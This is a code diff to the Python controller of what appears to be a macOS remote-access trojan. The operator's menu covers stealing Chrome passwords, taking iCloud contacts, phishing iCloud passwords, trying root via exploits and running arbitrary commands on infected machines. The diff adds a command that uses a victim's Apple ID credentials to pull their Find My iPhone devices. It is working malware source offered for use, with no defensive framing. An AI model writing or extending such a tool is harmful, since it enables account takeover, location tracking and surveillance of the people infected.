@@ -20,7 +20,7 @@ MESSAGE_INFO = "\033[94m" + "[I] " + "\033[0m"
 MESSAGE_ATTENTION = "\033[91m" + "[!] " + "\033[0m"
 
 commands = ["help", "status", "clients", "connect", "get_info", "get_root", "get_computer_name",
-            "get_shell_info", "chrome_passwords", "icloud_contacts", "icloud_phish", "kill_client"]
+            "get_shell_info", "chrome_passwords", "icloud_contacts", "icloud_phish", "find_my_iphone", "kill_client"]
 status_messages = []
 
 # The ID of the client is it's place in the array
@@ -35,9 +35,10 @@ def print_help():
     print "connect <ID>      -  Connect to the client."
     print "get_info          -  Show basic information about the client."
     print "get_root          -  Attempt to get root via exploits."
-    print "chrome_passwords  -  Attempt to retrieve Chrome passwords."
-    print "icloud_contacts   -  Attempt to retrieve iCloud contacts."
+    print "chrome_passwords  -  Retrieve Chrome passwords."
+    print "icloud_contacts   -  Retrieve iCloud contacts."
     print "icloud_phish      -  Attempt to get iCloud password via phishing."
+    print "find_my_iphone    -  Retrieve find my iphone devices."
     print "kill_client       -  Brutally kill the client (removes the server)."
     print "Any other command will be executed on the connected client."
 
@@ -214,6 +215,17 @@ if __name__ == '__main__':
                                         print MESSAGE_INFO + "Stopping phishing attempt, waiting for phishing output..."
                                         print send_command(connections[current_client_id], "icloud_phish_stop")
                                         break
+                        elif command == "find_my_iphone":
+                            email = raw_input(MESSAGE_INPUT + "Email: ")
+                            password = raw_input(MESSAGE_INPUT + "Password: ")
+
+                            if "@" not in email or password.strip() == "":
+                                print MESSAGE_ATTENTION + "Invalid email or password."
+                            else:
+                                print MESSAGE_INFO + "Getting find my iphone devices..."
+                                response = send_command(connections[current_client_id], "find_my_iphone {0} {1}".format(email, password))
+
+                                print response
                         elif command == "kill_client":
                             print MESSAGE_INFO + "Removing server..."
                             response = send_command(connections[current_client_id], "kill_client")
